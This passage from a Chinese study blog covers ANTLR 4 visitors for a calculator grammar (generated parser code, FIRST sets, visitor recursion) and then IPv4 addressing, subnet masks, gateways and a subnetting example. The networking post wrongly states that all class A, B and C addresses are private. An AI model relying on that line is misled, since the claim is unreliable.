<td>CalculatorVisitor.java</td>
<td>访问器接口</td>
</tr>
<tr>
<td>CalculatorBaseVisitor.java</td>
<td>访问器基类</td>
</tr>
</tbody></table>
<p>这个访问器接口定义了一些函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Generated from Calculator.g4 by ANTLR 4.7.2</span></span><br><span class="line"><span class="keyword">import</span> org.antlr.v4.runtime.tree.ParseTreeVisitor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">CalculatorVisitor</span>&lt;T&gt; <span class="keyword">extends</span> <span class="title class_">ParseTreeVisitor</span>&lt;T&gt; &#123;</span><br><span class="line"></span><br><span class="line">	T <span class="title function_">visitProg</span><span class="params">(CalculatorParser.ProgContext ctx)</span>;</span><br><span class="line"></span><br><span class="line">	T <span class="title function_">visitPrintExpr</span><span class="params">(CalculatorParser.PrintExprContext ctx)</span>;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>每个Calculator.g4中的标签都会对应一个接口函数,比如#printExpr对应到visitPrintExpr</p>
<p>即使是没有写标签的文法,也会对应一个接口函数,比如prog对应到visitProg</p>
<p>既然这样,为啥还要定义标签?使用默认的文法名</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">prog: stat+;</span><br><span class="line"></span><br><span class="line">stat: expr NEWLINE      #printExpr</span><br><span class="line">|ID <span class="string">&#x27;=&#x27;</span> expr NEWLINE    #assign</span><br><span class="line">|NEWLINE                #blank</span><br><span class="line">;</span><br></pre></td></tr></table></figure>

<p>对比一下,prog只有一条规则,但是stat有三条规则,因此需要给每个规则定义一个标签,方便给该规则上语义动作</p>
<p>也就是说,每一个翻译规则对应一个标签</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stat -&gt; expr NEWLINE      #printExpr</span><br><span class="line">stat -&gt; ID &#x27;=&#x27; expr NEWLINE    #assign</span><br><span class="line">stat -&gt; NEWLINE                #blank</span><br></pre></td></tr></table></figure>



<p>要怎么用这个访问器呢?</p>
<h3 id="定制访问器"><a href="#定制访问器" class="headerlink" title="定制访问器"></a>定制访问器</h3><p>只需要用一个EvalVisitor继承这个CalculatorBaseVisitor,然后在EvalVisitor中实现函数功能即可</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230526161920122.png" alt="image-20230526161920122"></p>
<p>不需要全都实现,因为CalculatorBaseVisitor中已经帮我们实现了默认方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span> </span><br><span class="line"><span class="keyword">public</span> T <span class="title function_">visitPrintExpr</span><span class="params">(CalculatorParser.PrintExprContext ctx)</span> &#123; </span><br><span class="line">    <span class="keyword">return</span> visitChildren(ctx); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p>以visitAssign的实现为例</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Integer <span class="title function_">visitAssign</span><span class="params">(CalculatorParser.AssignContext ctx)</span> &#123;</span><br><span class="line">    String id=ctx.ID().getText();</span><br><span class="line">    <span class="type">int</span> value=visit(ctx.expr());</span><br><span class="line">    memory.put(id,value);</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>CalculatorParser.AssignContext ctx</code>是个什么玩意儿,都有啥成员?</p>
<h4 id="visit函数干了啥"><a href="#visit函数干了啥" class="headerlink" title="visit函数干了啥?"></a>visit函数干了啥?</h4><p>首先,CalculatorParser是antlr4命令生成的语法分析器类,AssignContext是其内部类</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230526170129061.png" alt="image-20230526170129061"></p>
<p>CalculatorParser中有众多内部类,每个标签分别对应一个内部类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">AssignContext</span> <span class="keyword">extends</span> <span class="title class_">StatContext</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> TerminalNode <span class="title function_">ID</span><span class="params">()</span> &#123; <span class="keyword">return</span> getToken(CalculatorParser.ID, <span class="number">0</span>); &#125;</span><br><span class="line">	<span class="keyword">public</span> ExprContext <span class="title function_">expr</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> getRuleContext(ExprContext.class,<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> TerminalNode <span class="title function_">NEWLINE</span><span class="params">()</span> &#123; <span class="keyword">return</span> getToken(CalculatorParser.NEWLINE, <span class="number">0</span>); &#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">AssignContext</span><span class="params">(StatContext ctx)</span> &#123; copyFrom(ctx); &#125;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> &lt;T&gt; T <span class="title function_">accept</span><span class="params">(ParseTreeVisitor&lt;? extends T&gt; visitor)</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> ( visitor <span class="keyword">instanceof</span> CalculatorVisitor ) <span class="keyword">return</span> ((CalculatorVisitor&lt;? <span class="keyword">extends</span> <span class="title class_">T</span>&gt;)visitor).visitAssign(<span class="built_in">this</span>);</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">return</span> visitor.visitChildren(<span class="built_in">this</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>每个这种<code>*Context</code>内部类的实例,都是语法树上的节点,这一点可以观察*Context的类体系验证</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230526210500945.png" alt="image-20230526210500945"></p>
<p>任何<code>*Context</code>的直接父类都是<code>ParseRuleContext</code>类,该类中有一个<code>List&lt;ParseTree&gt; children</code>数组,用来存放子节点的句柄</p>
<p>无需置疑,这就是节点类</p>
<h5 id="EvalVisitor-CalculatorParser-ParserTree三者是如何交互的"><a href="#EvalVisitor-CalculatorParser-ParserTree三者是如何交互的" class="headerlink" title="EvalVisitor,CalculatorParser,ParserTree三者是如何交互的?"></a>EvalVisitor,CalculatorParser,ParserTree三者是如何交互的?</h5><p>跟随测试类的控制流观察</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ParseTree tree=parser.prog();</span><br><span class="line">EvalVisitor eval=<span class="keyword">new</span> <span class="title class_">EvalVisitor</span>();</span><br><span class="line">eval.visit(tree);</span><br></pre></td></tr></table></figure>

<p>ParserTree以parser.prog()入口,可以推测该函数应该是整个递归下降语法分析的入口,其返回值是一个 以prog节点为根的语法树,然后将该树根交给句柄tree</p>
<p>根据我们自己写的文法,整个程序确实只有一个prog,然后是<code>prog-&gt;stat+</code>,也就是推导成若干stat</p>
<p>下面验证一下这个prog函数是否如我们所料</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> ProgContext <span class="title function_">prog</span><span class="params">()</span> <span class="keyword">throws</span> RecognitionException &#123;</span><br><span class="line">	<span class="type">ProgContext</span> <span class="variable">_localctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProgContext</span>(_ctx, getState());<span class="comment">//创建Context节点,ctx是context缩写,一般__ctx表示当前上下文信息,也就是父节点</span></span><br><span class="line">       </span><br><span class="line">	enterRule(_localctx, <span class="number">0</span>, RULE_prog);<span class="comment">//进入prog文法状态</span></span><br><span class="line">	<span class="type">int</span> _la;<span class="comment">//输入中的下一个词法符号的标识</span></span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		enterOuterAlt(_localctx, <span class="number">1</span>);</span><br><span class="line">		&#123;</span><br><span class="line">		setState(<span class="number">7</span>); </span><br><span class="line">		_errHandler.sync(<span class="built_in">this</span>);</span><br><span class="line">		_la = _input.LA(<span class="number">1</span>);</span><br><span class="line">		<span class="keyword">do</span> &#123;</span><br><span class="line">			&#123;</span><br><span class="line">			&#123;</span><br><span class="line">			setState(<span class="number">6</span>);</span><br><span class="line">			stat();</span><br><span class="line">			&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			setState(<span class="number">9</span>); </span><br><span class="line">			_errHandler.sync(<span class="built_in">this</span>);</span><br><span class="line">			_la = _input.LA(<span class="number">1</span>);<span class="comment">//从输入流中取下一个符号</span></span><br><span class="line">		&#125; <span class="keyword">while</span> ( (((_la) &amp; ~<span class="number">0x3f</span>) == <span class="number">0</span> &amp;&amp; ((<span class="number">1L</span> &lt;&lt; _la) &amp; ((<span class="number">1L</span> &lt;&lt; T__1) | (<span class="number">1L</span> &lt;&lt; ID) | (<span class="number">1L</span> &lt;&lt; INT) | (<span class="number">1L</span> &lt;&lt; NEWLINE))) != <span class="number">0</span>) );</span><br><span class="line">               <span class="comment">//只要下一个待解析的词法符号的类型是 T__1、ID、INT 或 NEWLINE 中的任意一种，就执行循环体中的语句</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">catch</span> (RecognitionException re) &#123;</span><br><span class="line">		_localctx.exception = re;</span><br><span class="line">		_errHandler.reportError(<span class="built_in">this</span>, re);</span><br><span class="line">		_errHandler.recover(<span class="built_in">this</span>, re);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">finally</span> &#123;</span><br><span class="line">		exitRule();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> _localctx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>正如我们所料,prog函数的do-while循环中调用了stat函数</p>
<p>prog&#x3D; stat \n stat \n stat…</p>
<p>这个prog函数中的do-while循环,每循环一次,递归下降分析一次stat</p>
<p>为啥do-while循环的继续条件是”下一个待解析的词法符号的类型是 T__1、ID、INT 或 NEWLINE 中的任意一种，就执行循环体中的语句”</p>
<p>所有的词法符号类型都被定义在CalculatorLexer.tokens中</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">T__0=<span class="number">1</span></span><br><span class="line">T__1=<span class="number">2</span></span><br><span class="line">T__2=<span class="number">3</span></span><br><span class="line">MUL=<span class="number">4</span></span><br><span class="line">DIV=<span class="number">5</span></span><br><span class="line">ADD=<span class="number">6</span></span><br><span class="line">SUB=<span class="number">7</span></span><br><span class="line">ID=<span class="number">8</span></span><br><span class="line">INT=<span class="number">9</span></span><br><span class="line">WS=<span class="number">10</span></span><br><span class="line">NEWLINE=<span class="number">11</span></span><br><span class="line"><span class="string">&#x27;=&#x27;</span>=<span class="number">1</span></span><br><span class="line"><span class="string">&#x27;(&#x27;</span>=<span class="number">2</span></span><br><span class="line"><span class="string">&#x27;)&#x27;</span>=<span class="number">3</span></span><br><span class="line"><span class="string">&#x27;*&#x27;</span>=<span class="number">4</span></span><br><span class="line"><span class="string">&#x27;/&#x27;</span>=<span class="number">5</span></span><br><span class="line"><span class="string">&#x27;+&#x27;</span>=<span class="number">6</span></span><br><span class="line"><span class="string">&#x27;-&#x27;</span>=<span class="number">7</span></span><br></pre></td></tr></table></figure>

<p>T__1&#x3D;&#x3D;’(‘</p>
<p>也就是说,下一个符号必须得是’(‘,或者ID,INT,NEWLINE</p>
<p>然而再看我们的语法规则定义</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">prog: stat+;</span><br><span class="line"></span><br><span class="line">stat: expr NEWLINE      #printExpr</span><br><span class="line">|ID <span class="string">&#x27;=&#x27;</span> expr NEWLINE    #assign</span><br><span class="line">|NEWLINE                #blank</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line">expr: expr (<span class="string">&#x27;*&#x27;</span>|<span class="string">&#x27;/&#x27;</span>) expr   #MulDiv</span><br><span class="line">|expr (<span class="string">&#x27;+&#x27;</span>|<span class="string">&#x27;-&#x27;</span>) expr        #AddSub</span><br><span class="line">|INT                        #<span class="type">int</span></span><br><span class="line">|ID                         #id</span><br><span class="line">|<span class="string">&#x27;(&#x27;</span> expr <span class="string">&#x27;)&#x27;</span>               #parens</span><br><span class="line">;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>对stat求一下First集合</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">first(stat)=first(expr)+&#123;ID&#125;+&#123;NEWLINE&#125;=&#123;&#x27;(&#x27;,INT,ID,NEWLINE&#125;</span><br></pre></td></tr></table></figure>

<p>正好就是do-while循环的条件</p>
<p>根据编译原理的理论,只有当下一个符号在当前文法的First集合中时,才会从当前文法开始进行递归下降语法分析</p>
<p>还有一个问题,prog节点是何时把诸多stat节点设为自己的字节点的,也就是说stat节点是何时挂到语法树上的?</p>
<h5 id="Stat节点何时挂到Prog树根上去的"><a href="#Stat节点何时挂到Prog树根上去的" class="headerlink" title="Stat节点何时挂到Prog树根上去的?"></a>Stat节点何时挂到Prog树根上去的?</h5><p>到stat函数中看一看,第一行就创建了stat节点,和prog的第一行结构几乎一样,StatContext构造函数的第一个参数_ctx,这是一个全局变量,时刻维护当前节点的父节点.这样创建出的节点就知道自己的父节点是谁了</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> StatContext <span class="title function_">stat</span><span class="params">()</span> <span class="keyword">throws</span> RecognitionException &#123;</span><br><span class="line">	<span class="type">StatContext</span> <span class="variable">_localctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StatContext</span>(_ctx, getState());</span><br></pre></td></tr></table></figure>



<p>这一点也可以在StatContext的构造函数中验证</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">StatContext</span><span class="params">(ParserRuleContext parent, <span class="type">int</span> invokingState)</span> &#123;<span class="comment">//第一个参数就叫做parent,显然是当前节点的父节点</span></span><br><span class="line">	<span class="built_in">super</span>(parent, invokingState);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>那么stat知道自己的父节点是谁了,prog又是如何知道自己的子节点是谁的呢?</p>
<p>动态调试发现,stat函数执行后,ProgContext的Chindren数组就会多一个StatContext节点,具体怎么知道的,不想深究</p>
<h3 id="回到正题-visit函数干了啥"><a href="#回到正题-visit函数干了啥" class="headerlink" title="回到正题,visit函数干了啥"></a>回到正题,visit函数干了啥</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ParseTree tree=parser.prog();</span><br><span class="line">EvalVisitor eval=<span class="keyword">new</span> <span class="title class_">EvalVisitor</span>();</span><br><span class="line">eval.visit(tree);</span><br></pre></td></tr></table></figure>

<p>到现在位置,这三条的第一条分析完毕,目前tree是一个ProgContext句柄,语法树的树根</p>
<p>下面分析eval.visit(tree)干了啥</p>
<p>这个visit是AbstractParseTreeVisitor实现的</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230526214154072.png" alt="image-20230526214154072"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> T <span class="title function_">visit</span><span class="params">(ParseTree tree)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> tree.accept(<span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个tree.accept也是一个接口方法,每一个*Context类都有实现</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230526214634187.png" alt="image-20230526214634187"></p>
<p>就以AssignContext.accept()为例</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; T <span class="title function_">accept</span><span class="params">(ParseTreeVisitor&lt;? extends T&gt; visitor)</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> ( visitor <span class="keyword">instanceof</span> CalculatorVisitor ) </span><br><span class="line">              <span class="keyword">return</span> ((CalculatorVisitor&lt;? <span class="keyword">extends</span> <span class="title class_">T</span>&gt;)visitor).visitAssign(<span class="built_in">this</span>);</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">return</span> visitor.visitChildren(<span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果当前节点visitor是CalculatorVisitor接口的实例,则返回visitor.visitAssign(this),也就是assign标签对应的语义动作</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Integer <span class="title function_">visitAssign</span><span class="params">(CalculatorParser.AssignContext ctx)</span> &#123;</span><br><span class="line">    String id=ctx.ID().getText();</span><br><span class="line">    <span class="type">int</span> value=visit(ctx.expr());</span><br><span class="line">    memory.put(id,value);</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在知道了A.visit函数会调用EvalVisitor中当前节点对应的visitA函数</p>
<p>但是我们没有给prog-&gt;stat+定义标号,在EvalParser中并没有找到一个visitProg这样的函数,那么<code>eval.visit(tree);</code>到底调用了谁?动态调试发现调用的是CalculatorBaseVisitor类中的vistProg函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@Override public T visitProg(CalculatorParser.ProgContext ctx) &#123; return visitChildren(ctx); &#125;</span><br></pre></td></tr></table></figure>

<p>而在该类中的所有vist*函数,都只是简单的递归visitChildren,访问子节点</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">	<span class="meta">@Override</span> <span class="keyword">public</span> T <span class="title function_">visitPrintExpr</span><span class="params">(CalculatorParser.PrintExprContext ctx)</span> &#123; <span class="keyword">return</span> visitChildren(ctx); &#125;</span><br><span class="line">	<span class="meta">@Override</span> <span class="keyword">public</span> T <span class="title function_">visitAssign</span><span class="params">(CalculatorParser.AssignContext ctx)</span> &#123; <span class="keyword">return</span> visitChildren(ctx); &#125;</span><br><span class="line">	<span class="meta">@Override</span> <span class="keyword">public</span> T <span class="title function_">visitBlank</span><span class="params">(CalculatorParser.BlankContext ctx)</span> &#123; <span class="keyword">return</span> visitChildren(ctx); &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>其中vistAssign等被我们在EvalVisitor重写,因此不会调用父类中的简单实现</p>
<p><strong>也就是说<code>eval.visit(tree);</code>就是中心开花了,递归访问树根ProgContext的每个子节点StatContext,然后每个stat都会再递归调用自己的子节点的visit函数,文法翻译的过程就对应了这个递归调用的过程,其中语义动作的翻译,被我们重写在EvalVisitor中,会执行我们自定义的函数.其中没有语义动作的翻译,直接调用基类中的默认实现,直接递归子节点</strong></p>
<p>到此理清了CalculatorParser,EvalVisitor,ParserTree等几个类之间的关系和控制流的流向</p>
<h3 id="总结用antlr访问器实现计算器的步骤"><a href="#总结用antlr访问器实现计算器的步骤" class="headerlink" title="总结用antlr访问器实现计算器的步骤"></a>总结用antlr访问器实现计算器的步骤</h3><p>1.写Calculator.g4词法,语法规则文件,留标签为定义语法做准备</p>
<p>2.用antlr -visitor命令生成Calculator*.java一众文件</p>
<p>3.EvalVisitor类继承CalculatorBaseVisitor类</p>
<p>4.在EvalVisitor类中重写标签相对应的语义规则</p>
<p>5.编写测试类Test,于其中指定输入流,组装lexer,组装 parser,建立ParserTree,用EvalVisitor实例,访问语法树实例</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2023/02/12/%E7%BD%91%E7%BB%9C%E5%B1%82/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/12/%E7%BD%91%E7%BB%9C%E5%B1%82/" class="post-title-link" itemprop="url">计算机网络-网络层</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-02-12 18:29:00 / Modified: 18:29:10" itemprop="dateCreated datePublished" datetime="2023-02-12T18:29:00+08:00">2023-02-12</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><h3 id="IPv4"><a href="#IPv4" class="headerlink" title="IPv4"></a>IPv4</h3><h4 id="IPv4地址"><a href="#IPv4地址" class="headerlink" title="IPv4地址"></a>IPv4地址</h4><h5 id="早期地址分类"><a href="#早期地址分类" class="headerlink" title="早期地址分类"></a>早期地址分类</h5><p>最早的IP地址被划分为五类,ABCDE</p>
<p>根据前缀区分</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230208190722568.png" alt="image-20230208190722568"></p>
<p>A类地址的网络地址占一个字节</p>
<p>整个IP地址空间的一半都是A类地址</p>
<p>B类地址的网络地址占两个字节</p>
<p>整个IP地址空间的四分之一是B类地址</p>
<p>其中A,B,C类网络地址是私有地址</p>
<h5 id="特殊IP地址"><a href="#特殊IP地址" class="headerlink" title="特殊IP地址"></a>特殊IP地址</h5><table>
<thead>
<tr>
<th><strong>网络号</strong></th>
<th><strong>主机号</strong></th>
<th><strong>源地址使用</strong></th>
<th><strong>目的地址使用</strong></th>
<th><strong>意义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>0</td>
<td>可以</td>
<td>不可</td>
<td>默认路径地址0.0.0.0，<br />本网络上的本主机</td>
</tr>
<tr>
<td>0</td>
<td>host-id</td>
<td>可以</td>
<td>不可</td>
<td>本网络上的某个主机</td>
</tr>
<tr>
<td>全1</td>
<td>全1</td>
<td>不可</td>
<td>可以</td>
<td>广播地址255.255.255.255，<br />只在本网络上广播（路由器不转发）<br />范围局限在LAN中,即同一子网掩码的网段内</td>
</tr>
<tr>
<td>net-id</td>
<td>全1</td>
<td>不可</td>
<td>可以</td>
<td>特定子网的广播地址，<br />对net-id上所有主机广播</td>
</tr>
<tr>
<td>127</td>
<td>非全0或全1的数</td>
<td>可以</td>
<td>可以</td>
<td>用作本地软件环回测试</td>
</tr>
<tr>
<td>169.254</td>
<td>0</td>
<td>可以</td>
<td>可以</td>
<td>主机无法获取IP地址时<br />会自动配置地址169.254.x.x&#x2F;16，<br />使其可以通信</td>
</tr>
</tbody></table>
<h5 id="多级IP地址"><a href="#多级IP地址" class="headerlink" title="多级IP地址"></a>多级IP地址</h5><p>早期的网络地址&#x3D;网络号+主机号</p>
<p>然而这种划分有很多浪费,于是引入三级IP地址</p>
<p>网络地址&#x3D;网络号+子网号+主机号</p>
<p>只需要给大组织分配一个A或者B类地址,然后该组织自己划分子网号即可</p>
<p>只看IP地址是看不出有没有划分过子网的</p>
<p>这就是子网掩码的作用了</p>
<p>子网掩码”掩”住的是子网前缀,比如255.255.255.0这个子网掩码,它表明只有IP地址的最后一个字节才是主机号,前面的是网络号和子网号.</p>
<p>$$<br>网络地址(原网络地址+子网地址)&#x3D;IP地址 按位与 子网掩码<br>$$</p>
<p>192.168.1.0这是网络地址</p>
<p>192.168.1.255这是子网的广播地址</p>
<p>192.168.1.[1,254]这是可以给主机分配的IP地址</p>
<h5 id="子网掩码和网关"><a href="#子网掩码和网关" class="headerlink" title="子网掩码和网关"></a>子网掩码和网关</h5><p>一个计算机尝试访问另一个IP地址时,会进行如下计算:</p>
<p>自己的IP地址和自己的子网掩码按位与得到自己的网络地址</p>
<p>目标的IP地址和自己的子网掩码按位与,结果与自己的网络地址比较</p>
<p>如果相同说明目标计算机是”网上邻居”,同处于一个子网内,则链路层帧的目的MAC地址就会填写该目标计算机的MAC地址.如果不知道邻居的MAC地址,会使用ARP协议,根据邻居的IP地址,查邻居的MAC地址</p>
<p>如果不同说明目标不在同一子网内,需要访问”外面的世界”.这就需要网关转发,于是将链路层目的MAC地址填上网关的MAC地址.</p>
<blockquote>
<p>如何获取网关的MAC地址?</p>
<p>这台计算机是有网关的IP地址的,不管是手动填上的还是DHCP获取的,反正就是有</p>
<p>然后本计算机通过ARP协议,根据网关的IP地址询问网关的MAC地址</p>
</blockquote>
<p>这就存在一种单向通的情况:</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230208195437212.png" alt="image-20230208195437212"></p>
<p>192.168.3.4&#x2F;16可以往192.168.1.1&#x2F;24发包,并且可以被收到</p>
<p>但是192.168.1.1&#x2F;24无法向192.168.3.4&#x2F;16发包,</p>
<p>因为<a href="mailto:&#80;&#67;&#49;&#64;&#49;&#x39;&#x32;&#46;&#x31;&#x36;&#x38;&#46;&#x31;&#46;&#x31;">&#80;&#67;&#49;&#64;&#49;&#x39;&#x32;&#46;&#x31;&#x36;&#x38;&#46;&#x31;&#46;&#x31;</a>经过计算,192.168.3.4是一个外网地址,但是自己没有设置网关,因此不知道应该把包发给谁</p>
<h5 id="可变长子网掩码VLSM"><a href="#可变长子网掩码VLSM" class="headerlink" title="可变长子网掩码VLSM"></a>可变长子网掩码VLSM</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230208200108836.png" alt="image-20230208200108836"></p>
<h5 id="地址划分举例"><a href="#地址划分举例" class="headerlink" title="地址划分举例"></a>地址划分举例</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230208200145777.png" alt="image-20230208200145777"></p>
<blockquote>
<p>分配给某一小型组织机构一个地址块，我们已知块中一个地址是205.16.37.39&#x2F;28，求该块的起始地址?</p>
<p>网络前缀有28位,这就意味着IP地址的前三个字节都是固定死的205.16.37,最后这个字节的高四位是固定死的</p>
<p>39&#x3D;0010’0111b,那么起始地址应该是0010’0000b,也就是32</p>
<p>因此这个网络块的起始地址是205.16.37.32</p>
